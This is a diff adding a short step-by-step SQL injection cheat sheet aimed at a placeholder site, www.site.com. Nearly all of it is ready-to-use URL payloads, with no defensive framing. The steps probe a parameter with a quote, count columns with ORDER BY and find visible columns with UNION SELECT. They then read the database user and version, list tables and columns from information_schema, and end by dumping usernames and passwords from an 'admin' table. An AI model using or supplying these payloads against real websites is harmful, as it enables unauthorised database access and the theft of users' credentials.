@@ -1,0 +1,49 @@
+SQL Injection
+
+Step 1:
+www.site.com/page=1
+
+or
+www.site.com/id=5
+
+For example:
+
+www.site.com/page=1'
+
+Step 2
+
+www.site.com/page=1 order by 1--
+http://www.site.com/page=1 order by 2--
+http://www.site.com/page=1 order by 3--
+http://www.site.com/page=1 order by 4--
+http://www.site.com/page=1 order by 5--
+
+Step 3
+
+www.site.com/page=1 union all select 1,2,3,4--
+
+Step 4
+
+user()
+database()
+version()
+
+or
+
+@@user
+@@version
+@@database
+
+www.site.com/page=1 union all select 1,user(),version(),4--
+
+Step 5
+
+www.site.com/page=1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables--
+
+Step 6
+
+www.site.com/page=1 union all select 1,2,group_concat(column_name),4 from information_schema.columns where table_schema=database()--
+
+Step 7
+
+www.site.com/page=1 union all select 1,2,group_concat(username,0x3a,password),4 from admin--
